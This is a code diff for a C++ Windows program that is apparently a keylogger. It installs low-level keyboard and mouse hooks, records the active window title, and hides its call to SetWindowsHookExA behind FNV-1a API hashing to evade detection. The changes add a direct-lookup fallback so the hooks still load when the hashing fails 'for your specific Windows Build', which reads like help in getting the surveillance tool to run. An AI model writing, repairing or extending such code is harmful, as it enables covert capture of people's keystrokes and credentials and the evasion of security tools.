@@ -50,11 +50,9 @@ std::string GetActiveWindowTitle() {
 // --- 2. DEBUG LOGGING ---
 void WriteDebug(std::string msg) {
     char path[MAX_PATH];
-    // Attempt local write first
     std::ofstream f1("internal_status.txt", std::ios::app);
     if (f1.is_open()) { f1 << "[DEBUG] " << msg << std::endl; f1.close(); }
 
-    // Attempt Desktop write
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path) == S_OK) {
         std::string fullPath = std::string(path) + "\\debug_log.txt";
         std::ofstream f2(fullPath, std::ios::app);
@@ -62,7 +60,7 @@ void WriteDebug(std::string msg) {
     }
 }
 
-// --- 3. API HASHING ---
+// --- 3. API HASHING ENGINE ---
 constexpr DWORD HashString(const char* str) {
     DWORD hash = 0x811c9dc5;
     while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
@@ -179,8 +177,14 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
     HMODULE u32 = GetModuleHandleA("user32.dll");
     if (!u32) u32 = LoadLibraryA("user32.dll");
 
-    // Hash for SetWindowsHookExA = 0xDE2B4659
+    // Attempt Hashed Lookup
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
+
+    // Fallback for your specific Windows Build
+    if (!_SetHook) {
+        WriteDebug("API Hashing Failed. Switching to Direct Fallback...");
+        _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddress(u32, "SetWindowsHookExA");
+    }
 
     if (_SetHook) {
         HHOOK kHook = _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
@@ -189,10 +193,10 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
         if (kHook && mHook) {
             WriteDebug("Hooks Online. Monitoring input...");
         } else {
-            WriteDebug("Hook Registration Failed. Error Code: " + std::to_string(GetLastError()));
+            WriteDebug("Hook Error: " + std::to_string(GetLastError()));
         }
     } else {
-        WriteDebug("API Hashing Failed: Could not find SetWindowsHookExA");
+        WriteDebug("Critical: SetWindowsHookExA not found.");
     }
 
     MSG msg;
